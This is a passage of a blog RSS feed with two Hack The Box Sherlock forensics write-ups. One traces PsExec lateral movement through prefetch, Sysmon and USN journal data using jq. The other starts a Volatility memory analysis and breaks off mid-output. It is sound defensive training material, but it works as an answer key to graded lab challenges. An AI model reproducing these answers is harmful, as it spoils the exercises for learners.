<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Htb on Shakil's Blog</title><link>https://hshakilst.github.io/tags/htb/</link><description>Recent content in Htb on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Thu, 18 Sep 2025 05:07:43 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/htb/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Sherlock Tracer</title><link>https://hshakilst.github.io/posts/htb-sherlocks/tracer/</link><pubDate>Thu, 18 Sep 2025 05:07:43 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/tracer/</guid><description><![CDATA[<h1 id="tracer---dfir">Tracer - DFIR</h1>
<h3 id="scenario">Scenario</h3>
<p>A junior SOC analyst on duty has reported multiple alerts indicating the presence of PsExec on a workstation. They verified the alerts and escalated the alerts to tier II. As an Incident responder you triaged the endpoint for artifacts of interest. Now please answer the questions regarding this security event so you can report it to your incident manager.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
<th>Remarks</th>
</tr>
</thead>
<tbody>
<tr>
<td>tracer.zip</td>
<td>8cceeed93b876b9c60e53a1f2f7a68a1</td>
<td>hacktheblue</td>
<td>Contains Windows Event Logs, Prefetch files and UsnJournal files.</td>
</tr>
<tr>
<td>C/$Extend/$J</td>
<td>068a557274548bc88d2a9919c3195983</td>
<td></td>
<td>UsnJournal file&rsquo;s ADS.</td>
</tr>
<tr>
<td>20240620050901_PECmd_Output.json</td>
<td>1b3cd6882263b86735ebf0024c1cfa3d</td>
<td></td>
<td>Converted prefetch files to a single JSON file format.</td>
</tr>
<tr>
<td>20240620051031_EvtxECmd_Output.json</td>
<td>56c682158bd5e789558cf8a834313b60</td>
<td></td>
<td>Converted all the Windows .evtx file to a single JSON file.</td>
</tr>
<tr>
<td>20240620054048_MFTECmd_J_Output.csv</td>
<td>98eb829bfc6d7751aa1a51545a7ed430</td>
<td></td>
<td>Converted the Usn Journal file&rsquo;s ADS to a CSV file format.Â </td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>EvtxECmd - Eric Zimmerman Tools: To convert the windows event logs into a single JSON file.</li>
<li>PECmd - Eric Zimmerman Tools: To convert the prefetch files into a single JSON file.</li>
<li>MFTECmd - Eric Zimmerman Tools: To convert the Usn Journal&rsquo;s alternate data stream file $J to a CSV file format.</li>
</ul>
<h3 id="tasks">Tasks</h3>
<ol>
<li>The SOC Team suspects that an adversary is lurking in their environment and are using PsExec to move laterally. A junior SOC Analyst specifically reported the usage of PsExec on a Work Station. How many times was PsExec executed by the attacker on the system?</li>
<li>What is the name of the service binary dropped by PsExec tool allowing attacker to execute remote commands?</li>
<li>Now we have confirmed that PsExec ran multiple times, we are particularly interested in the 5th Last instance of the PsExec. What is the timestamp when the PsExec Service binary ran?</li>
<li>Can you confirm the hostname of the workstation from which attacker moved laterally?</li>
<li>What is full name of the Key File dropped by 5th last instance of the Psexec?</li>
<li>Can you confirm the timestamp when this key file was created on disk?</li>
<li>What is the full name of the Named Pipe ending with the &ldquo;stderr&rdquo; keyword for the 5th last instance of the PsExec?</li>
</ol>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>For task 1, 2, 3, 4 and 5 we can run the <code>jq</code> lang query on the converted prefetch JSON file <code>20240620050901_PECmd_Output.json</code> for <code>PSEXESVC.EXE</code> this is the service binary that handles the PsExec commands remotely or locally.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ cat 20240620050901_PECmd_Output.json | jq <span style="color:#f1fa8c">&#39;select(.ExecutableName==&#34;PSEXESVC.EXE&#34;)&#39;</span>                          
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SourceFilename&#34;</span>: <span style="color:#f1fa8c">&#34;prefetch\\PSEXESVC.EXE-AD70946C.pf&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SourceCreated&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-08 00:10:04&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SourceModified&#34;</span>: <span style="color:#f1fa8c">&#34;2024-06-20 05:04:51&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SourceAccessed&#34;</span>: <span style="color:#f1fa8c">&#34;2024-06-20 05:08:55&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ExecutableName&#34;</span>: <span style="color:#f1fa8c">&#34;PSEXESVC.EXE&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Hash&#34;</span>: <span style="color:#f1fa8c">&#34;AD70946C&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Size&#34;</span>: <span style="color:#f1fa8c">&#34;18142&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Version&#34;</span>: <span style="color:#f1fa8c">&#34;Windows 10 or Windows 11&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;RunCount&#34;</span>: <span style="color:#f1fa8c">&#34;9&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;LastRun&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 12:10:03&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun0&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 12:09:09&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun1&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 12:08:54&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun2&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 12:08:23&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun3&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 12:06:54&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun4&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 11:57:53&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun5&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 11:57:43&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PreviousRun6&#34;</span>: <span style="color:#f1fa8c">&#34;2023-09-07 11:55:44&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Volume0Name&#34;</span>: <span style="color:#f1fa8c">&#34;\\VOLUME{01d951602330db46-52233816}&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Volume0Serial&#34;</span>: <span style="color:#f1fa8c">&#34;52233816&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Volume0Created&#34;</span>: <span style="color:#f1fa8c">&#34;2023-03-08 01:48:53&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Directories&#34;</span>: <span style="color:#f1fa8c">&#34;\\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA, \\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA\\MICROSOFT, \\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA\\MICROSOFT\\CRYPTO, \\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA\\MICROSOFT\\CRYPTO\\RSA, \\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA\\MICROSOFT\\CRYPTO\\RSA\\S-1-5-18, \\VOLUME{01d951602330db46-52233816}\\WINDOWS, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;FilesLoaded&#34;</span>: <span style="color:#f1fa8c">&#34;\\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\NTDLL.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXESVC.EXE, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\KERNEL32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\KERNELBASE.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\LOCALE.NLS, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\USER32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\USERENV.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\WIN32U.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\UCRTBASE.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\GDI32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\RPCRT4.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\GDI32FULL.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\MSVCP_WIN.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\ADVAPI32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\MSVCRT.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\SECHOST.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\SHELL32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\WTSAPI32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\KERNEL.APPCORE.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\NTMARTA.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-CAD5E7EF.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\CRYPTSP.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\RSAENH.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\BCRYPT.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\SSPICLI.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\PROFAPI.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\BCRYPTPRIMITIVES.DLL, \\VOLUME{01d951602330db46-52233816}\\PROGRAMDATA\\MICROSOFT\\CRYPTO\\RSA\\S-1-5-18\\F05260A40AE771219C4528E4628312CD_B02EC91E-ADE1-4F67-9328-AE89B0EBD197, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\CRYPTBASE.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\NETAPI32.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\LOGONCLI.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\NETUTILS.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\SYSTEM32\\WINSTA.DLL, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-89A517EE.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-415385DF.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-C3E84A44.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-95F03CFE.KEY, \\VOLUME{01d951602330db46-52233816}\\</span><span style="color:#8be9fd;font-style:italic">$MFT</span><span style="color:#f1fa8c">, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-663BCB85.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-7AA5D6C6.KEY, \\VOLUME{01d951602330db46-52233816}\\WINDOWS\\PSEXEC-FORELA-WKSTN001-EDCC783C.KEY&#34;</span>,                                                
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ParsingError&#34;</span>: <span style="color:#8be9fd;font-style:italic">false</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>A note to count the binary last runs, we should start from the LastRun as <span style="color:#bd93f9">1</span>, PreviousRun0 as <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">and</span> so on<span style="color:#ff79c6">.</span> The order of the FilesLoaded also follows this rule<span style="color:#ff79c6">.</span> The latest run<span style="color:#f1fa8c">&#39;s loaded files are on top and the first run&#39;</span>s loaded files are <span style="color:#ff79c6">in</span> the bottom<span style="color:#ff79c6">.</span> 
</span></span></code></pre></div><p>To answer the question for Task 6 we can search the Usn Journal records and search for the update reason attribute which is <code>FileCreate</code>.
![[Pasted image 20240621073521.png]]</p>
<p>To answer the last Task&rsquo;s question we need search for <code>PipeEvent (Pipe Created)</code> which has an event ID of 17 and then search for pipe names that ends with <code>stderr</code> and that was created when the last 5th instance of PsExec was ran. We can do the following and compare the date created with the last 5th instance&rsquo;s run time.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ cat 20240620051031_EvtxECmd_Output.json | jq <span style="color:#f1fa8c">&#39;. | select(.TimeCreated &gt;= &#34;2023-09-07 12:06:54&#34; and .EventId==17) | select(.PayloadData2 | test(&#34;stderr$&#34;))&#39;</span> -c | head -n1
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;PayloadData1&#34;</span>:<span style="color:#f1fa8c">&#34;ProcessID: 6836, ProcessGUID: b02ec91e-bcde-64f9-0c02-000000003000&#34;</span>,<span style="color:#f1fa8c">&#34;PayloadData2&#34;</span>:<span style="color:#f1fa8c">&#34;PipeName: \\PSEXESVC-FORELA-WKSTN001-3056-stderr&#34;</span>,<span style="color:#f1fa8c">&#34;PayloadData5&#34;</span>:<span style="color:#f1fa8c">&#34;Image: C:\\WINDOWS\\PSEXESVC.exe&#34;</span>,<span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>,<span style="color:#f1fa8c">&#34;MapDescription&#34;</span>:<span style="color:#f1fa8c">&#34;PipeEvent (Pipe Created)&#34;</span>,<span style="color:#f1fa8c">&#34;ChunkNumber&#34;</span>:5,<span style="color:#f1fa8c">&#34;Computer&#34;</span>:<span style="color:#f1fa8c">&#34;Forela-Wkstn002.forela.local&#34;</span>,<span style="color:#f1fa8c">&#34;Payload&#34;</span>:<span style="color:#f1fa8c">&#34;{\&#34;EventData\&#34;:{\&#34;Data\&#34;:[{\&#34;@Name\&#34;:\&#34;RuleName\&#34;,\&#34;#text\&#34;:\&#34;-\&#34;},{\&#34;@Name\&#34;:\&#34;EventType\&#34;,\&#34;#text\&#34;:\&#34;CreatePipe\&#34;},{\&#34;@Name\&#34;:\&#34;UtcTime\&#34;,\&#34;#text\&#34;:\&#34;2023-09-07 12:06:55.069\&#34;},{\&#34;@Name\&#34;:\&#34;ProcessGuid\&#34;,\&#34;#text\&#34;:\&#34;b02ec91e-bcde-64f9-0c02-000000003000\&#34;},{\&#34;@Name\&#34;:\&#34;ProcessId\&#34;,\&#34;#text\&#34;:\&#34;6836\&#34;},{\&#34;@Name\&#34;:\&#34;PipeName\&#34;,\&#34;#text\&#34;:\&#34;\\\\PSEXESVC-FORELA-WKSTN001-3056-stderr\&#34;},{\&#34;@Name\&#34;:\&#34;Image\&#34;,\&#34;#text\&#34;:\&#34;C:\\\\WINDOWS\\\\PSEXESVC.exe\&#34;},{\&#34;@Name\&#34;:\&#34;User\&#34;,\&#34;#text\&#34;:\&#34;NT AUTHORITY\\\\SYSTEM\&#34;}]}}&#34;</span>,<span style="color:#f1fa8c">&#34;UserId&#34;</span>:<span style="color:#f1fa8c">&#34;S-1-5-18&#34;</span>,<span style="color:#f1fa8c">&#34;Channel&#34;</span>:<span style="color:#f1fa8c">&#34;Microsoft-Windows-Sysmon/Operational&#34;</span>,<span style="color:#f1fa8c">&#34;Provider&#34;</span>:<span style="color:#f1fa8c">&#34;Microsoft-Windows-Sysmon&#34;</span>,<span style="color:#f1fa8c">&#34;EventId&#34;</span>:17,<span style="color:#f1fa8c">&#34;EventRecordId&#34;</span>:<span style="color:#f1fa8c">&#34;159603&#34;</span>,<span style="color:#f1fa8c">&#34;ProcessId&#34;</span>:3552,<span style="color:#f1fa8c">&#34;ThreadId&#34;</span>:4360,<span style="color:#f1fa8c">&#34;Level&#34;</span>:<span style="color:#f1fa8c">&#34;Info&#34;</span>,<span style="color:#f1fa8c">&#34;Keywords&#34;</span>:<span style="color:#f1fa8c">&#34;Classic&#34;</span>,<span style="color:#f1fa8c">&#34;SourceFile&#34;</span>:<span style="color:#f1fa8c">&#34;.\\System32\\winevt\\logs\\Microsoft-Windows-Sysmon%4Operational.evtx&#34;</span>,<span style="color:#f1fa8c">&#34;ExtraDataOffset&#34;</span>:0,<span style="color:#f1fa8c">&#34;HiddenRecord&#34;</span>:false,<span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>:<span style="color:#f1fa8c">&#34;2023-09-07T12:06:55.0846666+00:00&#34;</span>,<span style="color:#f1fa8c">&#34;RecordNumber&#34;</span>:159603<span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>In this Sherlock we explored the Usn Journal and deep dived into Windows prefetch files. Also, a moderate understanding of PsExec commands was necessary to answer the task question. Finally, I included some resources to read about more those two above mentioned artifacts.</p>
]]></description></item><item><title>HTB Sherlock Mellitus</title><link>https://hshakilst.github.io/posts/htb-sherlocks/mellitus/</link><pubDate>Fri, 21 Jun 2024 04:55:59 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/mellitus/</guid><description><![CDATA[<h1 id="mellitus---dfir">Mellitus - DFIR</h1>
<h3 id="scenario">Scenario</h3>
<p>Youâve been a SOC analyst for the last 4 years but youâve been honing your incident response skills! Itâs about time you bite the bullet and go for your dream job as an Incident Responder as thatâs the path youâd like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
<th>Remarks</th>
</tr>
</thead>
<tbody>
<tr>
<td>mellitus.zip</td>
<td>0272fd0c8105b555a1ce17d0959b9cb8</td>
<td>hacktheblue</td>
<td></td>
</tr>
<tr>
<td>memory_dump.vmem</td>
<td>91a4ae43d463bfb9a9806b7716875415</td>
<td></td>
<td>Windows Memory Dump file of a VM instance.</td>
</tr>
<tr>
<td>memory_dump.vmsn</td>
<td>c17f871c05286923eb06d5dcb5136297</td>
<td></td>
<td>VMware Snapshot file for the VM instance.</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>Volatility3 and Volatility2</li>
<li>EvtxECmd - Zimmerman Tools</li>
<li>jq</li>
<li>LibreOffice Calc</li>
<li>Gimp 2.10.38</li>
</ul>
<h3 id="tasks">Tasks</h3>
<ol>
<li>What was the time on the system when the memory was captured?</li>
<li>What is the IP address of the attacker?</li>
<li>What is the name of the strange process?</li>
<li>What is the PID of the process that launched the malicious binary?</li>
<li>What was the command that got the malicious binary onto the machine?</li>
<li>The attacker attempted to gain entry to our host via FTP. How many users did they attempt?</li>
<li>What is the full URL of the last website the attacker visited?</li>
<li>What is the affected users password?</li>
<li>There is a flag hidden related to PID 5116. Can you confirm what it is?</li>
</ol>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>For Task 1 we can analyze the memdump using the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.info                      
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00               PDB scanning finished                        
</span></span><span style="display:flex;"><span>Variable        Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Kernel Base     0xf80638aa5000
</span></span><span style="display:flex;"><span>DTB     0x1ad000
</span></span><span style="display:flex;"><span>Symbols file:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/8B11040A5928757B11390AC78F6B6925-1.json.xz
</span></span><span style="display:flex;"><span>Is64Bit True
</span></span><span style="display:flex;"><span>IsPAE   False
</span></span><span style="display:flex;"><span>layer_name      <span style="color:#bd93f9">0</span> WindowsIntel32e
</span></span><span style="display:flex;"><span>memory_layer    <span style="color:#bd93f9">1</span> VmwareLayer
</span></span><span style="display:flex;"><span>base_layer      <span style="color:#bd93f9">2</span> FileLayer
</span></span><span style="display:flex;"><span>meta_layer      <span style="color:#bd93f9">2</span> FileLayer
</span></span><span style="display:flex;"><span>KdVersionBlock  0xf80638ea7dc0
</span></span><span style="display:flex;"><span>Major/Minor     15.17763
</span></span><span style="display:flex;"><span>MachineType     <span style="color:#bd93f9">34404</span>
</span></span><span style="display:flex;"><span>KeNumberProcessors      <span style="color:#bd93f9">2</span>
</span></span><span style="display:flex;"><span>SystemTime      2023-10-31 13:59:26
</span></span><span style="display:flex;"><span>NtSystemRoot    C:<span style="color:#f1fa8c">\W</span>indows
</span></span><span style="display:flex;"><span>NtProductType   NtProductWinNt
</span></span><span style="display:flex;"><span>NtMajorVersion  <span style="color:#bd93f9">10</span>
</span></span><span style="display:flex;"><span>NtMinorVersion  <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>PE MajorOperatingSystemVersion  <span style="color:#bd93f9">10</span>
</span></span><span style="display:flex;"><span>PE MinorOperatingSystemVersion  <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>PE Machine      <span style="color:#bd93f9">34404</span>
</span></span><span style="display:flex;"><span>PE TimeDateStamp        Thu Oct <span style="color:#bd93f9">28</span> 12:04:50 <span style="color:#bd93f9">2060</span>
</span></span></code></pre></div><p>For the task 2 I used the <code>netscan</code> plugin to get the IP address. But, I should have first found the malicious process and then analyze the process. Unfortunately, I couldn&rsquo;t dump the malicious process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.netscan
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00               PDB scanning finished                        
</span></span><span style="display:flex;"><span>Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0xc40aa1be7050  TCPv4   0.0.0.0 <span style="color:#bd93f9">135</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">880</span>     svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa1be71a0  TCPv4   0.0.0.0 <span style="color:#bd93f9">49664</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">472</span>     wininit.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa1be82b0  TCPv4   0.0.0.0 <span style="color:#bd93f9">135</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">880</span>     svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa1be82b0  TCPv6   ::      <span style="color:#bd93f9">135</span>     ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">880</span>     svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa1be8400  TCPv4   0.0.0.0 <span style="color:#bd93f9">49664</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">472</span>     wininit.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa1be8400  TCPv6   ::      <span style="color:#bd93f9">49664</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">472</span>     wininit.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394050  TCPv4   0.0.0.0 <span style="color:#bd93f9">49666</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1208</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394440  TCPv4   0.0.0.0 <span style="color:#bd93f9">49665</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1332</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa53946e0  TCPv4   0.0.0.0 <span style="color:#bd93f9">49667</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2328</span>    spoolsv.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa53946e0  TCPv6   ::      <span style="color:#bd93f9">49667</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2328</span>    spoolsv.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394830  TCPv4   0.0.0.0 <span style="color:#bd93f9">49665</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1332</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394830  TCPv6   ::      <span style="color:#bd93f9">49665</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1332</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394ad0  TCPv4   0.0.0.0 <span style="color:#bd93f9">49676</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">636</span>     lsass.exe       2023-10-31 13:31:07.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394ad0  TCPv6   ::      <span style="color:#bd93f9">49676</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">636</span>     lsass.exe       2023-10-31 13:31:07.000000 
</span></span><span style="display:flex;"><span>0xc40aa5394ec0  UDPv4   192.168.157.144 <span style="color:#bd93f9">137</span>     *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">4</span>       System  2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395160  TCPv4   0.0.0.0 <span style="color:#bd93f9">49667</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2328</span>    spoolsv.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa53952b0  TCPv4   192.168.157.144 <span style="color:#bd93f9">139</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">4</span>       System  2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395400  UDPv4   192.168.157.144 <span style="color:#bd93f9">138</span>     *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">4</span>       System  2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395550  UDPv4   0.0.0.0 <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395550  UDPv6   ::      <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa53956a0  UDPv4   0.0.0.0 <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:30:58.000000 
